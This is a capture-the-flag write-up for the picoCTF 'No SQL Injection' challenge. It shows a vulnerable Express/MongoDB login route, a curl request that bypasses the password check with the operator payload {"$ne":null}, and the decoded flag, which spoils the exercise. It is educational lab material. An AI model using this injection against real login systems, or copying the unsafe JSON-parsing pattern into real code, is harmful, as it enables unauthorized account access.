# No SQL Injection â€” Pico Gym

> **Room / Challenge:** No SQL Injection (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** Pico Gym
- **Challenge:** No SQL Injection (web)
- **Link**: `https://play.picoctf.org/practice/challenge/443`
- **Difficulty:** `Medium`
- **Date:** `23-10-2025`

---

## Goal

We have to get the flag by using No SQL Injection.

## My Solution

You can download the source code [here](./app.tar.gz)

The `server.js` is simple with three routes:

```javascript
// Serve the HTML form
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// Serve the admin page
app.get("/admin", (req, res) => {
  res.sendFile(path.join(__dirname, "admin.html"));
});

// Handle login form submission with JSON
app.post("/login", async (req, res) => {
  const { email, password } = req.body;

  try {
    const user = await User.findOne({
      email:
        email.startsWith("{") && email.endsWith("}")
          ? JSON.parse(email)
          : email,
      password:
        password.startsWith("{") && password.endsWith("}")
          ? JSON.parse(password)
          : password,
    });

    if (user) {
      res.json({
        success: true,
        email: user.email,
        token: user.token,
        firstName: user.firstName,
        lastName: user.lastName,
      });
    } else {
      res.json({ success: false });
    }
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});
```

Examining the code the only way to get the flag is by logging in as `picoplayer355@picoctf.org` and then get the token which is set default to `flag` in `userSchema`:

```javascript
const userSchema = new mongoose.Schema({
  email: { type: String, required: true, unique: true },
  firstName: { type: String, required: true },
  lastName: { type: String, required: true },
  password: { type: String, required: true },
  token: { type: String, required: false, default: "{{Flag}}" },
});
```

Like SQL Injection, there are loads of common payloads to exploit No SQL Injection and with this simple payload `{\"$ne\":null}`, I created a simple `curl` command to log in as `picoplayer355@picoctf.org` and get the token:

```bash
curl -s -X POST http://SERVER/login \
  -H "Content-Type: application/json" \
  -d '{"email":"picoplayer355@picoctf.org","password":"{\"$ne\":null}"}'


{"success":true,"email":"picoplayer355@picoctf.org","token":"cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzI1YmE0ZGUxfQ==","firstName":"pico","lastName":"player"}
```

The token looks like a base64 hash so I decode it and get the flag:

```bash
echo "cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzI1YmE0ZGUxfQ==" | base64 -d

picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_25ba4de1}
```

Flag: `picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_25ba4de1}`
